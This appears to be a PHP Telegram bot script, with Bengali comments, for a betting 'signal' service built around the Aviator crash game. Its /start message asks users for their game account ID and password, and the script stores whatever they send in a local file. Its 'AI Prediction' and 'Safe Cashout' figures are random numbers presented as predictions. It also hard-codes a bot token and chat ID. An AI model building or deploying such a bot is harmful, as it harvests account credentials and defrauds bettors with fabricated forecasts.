<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// --- কনফিগারেশন ---
$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
$chatId = "6109947429"; // এখানে আপনার আসল আইডিটি দিন
$ownerName = "R8rAIHAN";
$botName = "R8rAIHAN Aviator Bot";
// -----------------

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// ১. টেলিগ্রাম কমান্ড হ্যান্ডেল
if (isset($data['message'])) {
    $text = $data['message']['text'] ?? '';
    $uId = $data['message']['chat']['id'];

    if ($text == "/start") {
        $msg = "🚀 **Welcome to $botName** 🚀\n\n👤 **Owner:** $ownerName\n✅ **Status:** 100% Working\n\nনিচের ফরম্যাটে আইডি-পাসওয়ার্ড দিয়ে লগইন করুন:\n🆔 **ID:** আপনার আইডি\n🔑 **Password:** আপনার পাসওয়ার্ড";
        sendTelegram($botToken, $uId, $msg);
        exit;
    }

    if (str_contains(strtolower($text), 'id') && str_contains(strtolower($text), 'password')) {
        file_put_contents('auth.json', json_encode(['status' => 'ok', 'user' => $text]));
        sendTelegram($botToken, $uId, "✅ **Login Success!** এখন থেকে অটোমেটিক সিগন্যাল পাবেন।");
        exit;
    }
}

// ২. সিগন্যাল জেনারেশন (Extension থেকে আসা ডেটা)
if (isset($data['multiplier'])) {
    $lastVal = floatval($data['multiplier']);
    
    // ডুপ্লিকেট চেক (একই ভ্যালু বারবার প্রসেস করবে না)
    $oldVal = file_exists('last_check.txt') ? file_get_contents('last_check.txt') : "";
    
    if ($lastVal != $oldVal && file_exists('auth.json')) {
        // প্রেডিকশন লজিক
        $pred = ($lastVal < 1.8) ? rand(240, 580)/100 : rand(110, 215)/100;
        
        $signal = "🎯 **NEW SIGNAL DETECTED** 🎯\n";
        $signal .= "----------------------------\n";
        $signal .= "📊 Last Result: " . $lastVal . "x\n";
        $signal .= "🚀 **AI Prediction: " . round($pred, 2) . "x**\n";
        $signal .= "💰 Safe Cashout: " . round($pred * 0.88, 2) . "x\n";
        $signal .= "✅ Server: " . ($data['merchant'] ?? 'pkok_live');

        sendTelegram($botToken, $chatId, $signal);
        file_put_contents('last_check.txt', $lastVal);
    }
}

function sendTelegram($token, $chatId, $msg) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=".urlencode($msg)."&parse_mode=Markdown";
    file_get_contents($url);
}
?>
